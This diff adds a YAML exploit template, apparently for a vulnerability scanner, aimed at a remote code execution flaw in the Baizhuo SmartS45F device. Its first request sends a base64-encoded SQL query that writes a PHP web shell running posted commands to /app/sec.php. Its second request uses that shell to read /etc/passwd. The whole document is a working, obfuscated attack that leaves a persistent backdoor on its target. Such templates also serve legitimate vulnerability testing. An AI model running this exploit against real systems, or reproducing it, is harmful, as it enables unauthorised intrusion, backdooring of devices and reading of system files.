@@ -1,0 +1,22 @@
+id: poc-yaml-baizhuo-SmartS45F-rce
+info:
+  name: 百卓-SmartS45F-远程代码执行
+  severity: critical
+  tags:
+  - rce
+  finger: SmartS45F
+requests:
+- method: GET
+  path: /importexport.php?sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc2VjLnBocCc=&type=exportexcelbysql
+  expression: status_code == 200
+- method: POST
+  path: /app/sec.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'cmd=cat /etc/passwd
+
+    '
+  expression: status_code == 200 && contains(body, "root:") && contains(body, "/bin")
+    && !contains(body, "<")
+variables: {}
+transport: http
